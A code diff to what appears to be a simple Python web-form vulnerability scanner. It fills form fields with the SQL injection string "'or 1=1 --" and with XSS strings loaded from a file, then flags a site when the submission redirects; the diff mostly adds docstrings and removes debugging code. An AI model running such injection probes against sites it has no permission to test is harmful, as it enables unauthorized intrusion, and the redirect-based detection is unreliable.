@@ -3,12 +3,16 @@ from copy import deepcopy
 import requests
 import mechanize
 
+# Lists of vulnerable field types
 validfields = ["url", "text","password"]
 
-validfields = ["url", "text","password"]
 
 
 def sqltest(url):
+    """ Runs the Sql injection attack by:
+        1. Using mechanize to retrieve the webpage
+        2. Identifies all loaded forms on the webpage
+        3. Runs the malicious text against the loaded forms"""
 
     br = mechanize.Browser()
     br.set_handle_robots(False)  # ignore robots
@@ -23,44 +27,22 @@ def sqltest(url):
         for field in form.controls:
             if field.type in validfields:
                 tempBr.form[field.name] = "'or 1=1 --"
-        breakpoint()
+
         req = tempBr.form.click(type="submit")
         submitUrl = req.get_full_url()
         response = mechanize.urlopen(req)
         if response.geturl() != submitUrl:
             return True
-        """response = tempBr.submit()
-        if 300 <= response.getcode() < 400:
-            return True"""
-    """
-    br.form
-    response = requests.get(url, verify=False)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    for form in soup.find_all('form'):
 
-        print(form)
-        submitUrl = form['action']
-        submitMethod = form.get('method', 'GET')
-        form.find_all('input')
-        formData = {}
-        for x in form.find_all('input'):
-            if x.get('type', "text") in validfields and x.get('name'):
-                formData[x['name']] = "' or 1=1 --"
-
-        #if submitUrl.startswith('/') or not submitUrl.startswith("http"):
-        #    submitUrl = url + submitUrl.lstrip('/')
-        submitUrl = "/".join(url.split("/")[:3]) + "/" + submitUrl.lstrip('/')
-
-        response = requests.request(submitMethod, submitUrl, data=formData, verify=False)
-        breakpoint()
-        print(response.status_code)
-        if 300 <= response.status_code < 400:
-            return True
-            """
     return False
 
 
 def xsstest(url):
+
+    """ Runs the attack by:
+        1. Using mechanize to retrieve the webpage
+        2. Identifies all loaded forms on the webpage
+        3. Runs the malicious text against the loaded forms"""
     with open("XSSstrings.txt") as fin:
         XSSstrings = fin.read().splitlines()
 
@@ -79,37 +61,11 @@ def xsstest(url):
             for field in form.controls:
                 if field.type in validfields:
                     tempBr.form[field.name] = string
-           # breakpoint()
+
             req = tempBr.form.click(type="submit")
             submitUrl = req.get_full_url()
             response = mechanize.urlopen(req)
             if response.geturl() != submitUrl:
                 return True
     return False
-"""
-    response = requests.get(url, verify=False)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    form = soup.find('form')
-    submitUrl = form['action']
-    submitMethod = form.get('method', 'GET')
-    form.find_all('input')
-    with open("XSSstrings.txt") as fin:
-        XSSstrings = fin.read().splitlines()
 
-    for XSS in XSSstrings:
-
-        formData = {}
-        for x in form.find_all('input'):
-            if x.get('type', "text") in validfields and x.get('name'):
-                formData[x['name']] = XSS
-
-        if submitUrl.startswith('/'):
-            submitUrl = url.rstrip('/') + submitUrl
-
-        response = requests.request(submitMethod, submitUrl, data=formData, verify=False)
-        print(response.status_code)
-        if XSS in response.text:
-
-            return True
-    return False
-    """
